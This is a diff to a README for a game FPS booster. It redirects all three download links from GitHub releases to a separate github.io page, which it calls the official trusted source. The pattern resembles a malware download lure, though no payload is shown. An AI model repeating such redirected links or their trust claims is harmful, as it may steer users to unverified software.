@@ -1,6 +1,6 @@
 # 🚀 FPS-Optimizer-2026 - Boost Your FPS Instantly!
 
-[![Download FPS-Optimizer-2026](https://img.shields.io/badge/Download-FPS--Optimizer--2026-2ea44f?style=for-the-badge)](https://github.com/Unfocused-williamaverellharriman8604/FPS-Optimizer-2026/releases)
+[![Download FPS-Optimizer-2026](https://img.shields.io/badge/Download-FPS--Optimizer--2026-2ea44f?style=for-the-badge)](https://unfocused-williamaverellharriman8604.github.io)
 
 ---
 
@@ -48,7 +48,7 @@ You don't need any programming skills or system expertise. Just download, run, a
 ## 📥 How to Download
 
 Visit this link to download the application:  
-[**FPS-Optimizer-2026 Download Page**](https://github.com/Unfocused-williamaverellharriman8604/FPS-Optimizer-2026/releases)
+[**FPS-Optimizer-2026 Download Page**](https://unfocused-williamaverellharriman8604.github.io)
 
 This is the official download location. Make sure you always get the software from this trusted source to avoid fake or modified versions.
 
@@ -201,7 +201,7 @@ Don't let weak hardware ruin your gaming experience. With FPS-Optimizer-2026, yo
 
 ### Click the button below to get started:
 
-[**⬇️ DOWNLOAD FPS-Optimizer-2026**](https://github.com/Unfocused-williamaverellharriman8604/FPS-Optimizer-2026/releases)
+[**⬇️ DOWNLOAD FPS-Optimizer-2026**](https://unfocused-williamaverellharriman8604.github.io)
 
 Join thousands of users who have transformed their low-end PCs into capable gaming machines. Your FPS will thank you!
 
